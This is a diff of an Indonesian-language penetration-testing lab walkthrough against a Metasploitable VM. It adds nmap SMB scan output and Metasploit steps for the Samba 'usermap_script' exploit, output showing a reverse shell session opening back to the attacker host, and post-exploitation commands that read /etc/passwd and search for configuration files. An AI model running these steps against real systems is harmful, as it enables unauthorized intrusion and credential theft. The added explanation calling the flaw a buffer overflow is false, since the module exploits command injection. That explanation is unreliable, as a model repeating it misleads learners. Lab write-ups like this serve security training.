@@ -27,9 +27,21 @@ Memindai port samba, yaitu 445 (SMB over TCP) dan 139 (NetBIOS-SSN) pada IP targ
 ```
 nmap -p 445,139 --script=smb-os-discovery <ip_metasploitable>
 ```
-
+Script _smb-os-discovery_ digunakan untuk mendeteksi sistem operasi target, nama hostname, dan informasi domain/workgroup melalui protokol Samba.
 ```
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:68:17:AC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
+Host script results:
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: metasploitable
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: metasploitable.localdomain
+|_  System time: 2025-08-21T06:56:33-04:00
 ```
 **3. _Gaining Access (Exploitation)_**
 - Menjalankan Metasploit Framework
@@ -38,24 +50,28 @@ msfconsole
 ```
 - Mencari modul eksploitasi yang sesuai dengan kerentanan yang ditemukan
 ```
-search vsftpd 2.3.4
+search samba usermap
 ```
 
 ```
 Matching Modules
 ================
 
-   #  Name                                  Disclosure Date  Rank       Check  Description
-   -  ----                                  ---------------  ----       -----  -----------
-   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
 
 ```
+Modul _exploit/multi/samba/usermap_script_ akan mengirimkan payload yang telah dikonfigurasi ke server Samba, memanfaatkan _buffer overflow_ untuk mendapatkan shell dengan hak akses root.
+
+Modul ini menargetkan kerentanan pada utilitas usermap di dalam Samba, yang secara spesifik ada di versi-versi lama Samba (seperti 3.0.20 hingga 3.0.25rc3).
 - Memilih dan mengatur eksploitasi
 ```
-use exploit/unix/ftp/vsftpd_234_backdoor
+use exploit/multi/samba/usermap_script
 set RHOSTS <ip_metasploitable>
 set LHOST <ip_kali_linux>
 ```
+
 - Cek _requirement_, pastikan tidak ada yang kurang atau terlewat
 ```
 show options
@@ -66,11 +82,9 @@ exploit
 ```
 
 ```
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
-[*] 192.168.22.64:21 - The port used by the backdoor bind listener is already open
-[+] 192.168.22.64:21 - UID: uid=0(root) gid=0(root)
-[*] Found shell.
-[*] Command shell session 1 opened (192.168.22.63:33787 -> 192.168.22.64:6200) at 2025-08-21 07:03:24 -0400
+msf6 exploit(multi/samba/usermap_script) > exploit
+[*] Started reverse TCP handler on 192.168.175.235:4444 
+[*] Command shell session 1 opened (192.168.175.235:4444 -> 192.168.175.90:58041) at 2025-08-13 09:28:17 -0400
 
 ```
 **4. _Maintaining accsess dan Post exploitation_**
@@ -80,11 +94,14 @@ whoami
 ```
 - Eksplorasi sistem
 ```
-ls -l      //melihat list file dan direktory
+ls -l                    //melihat list file dan direktory
 ```
 ```
-uname -a   //melihat versi kernel dan informasi sistem
+uname -a                 //melihat versi kernel dan informasi sistem
 ```
 ```
-cat /etc/passwd  //melihat daftar user
+cat /etc/passwd          //melihat daftar user
+```
+```
+find / -name "*.conf"    //mencari file sensitif
 ```
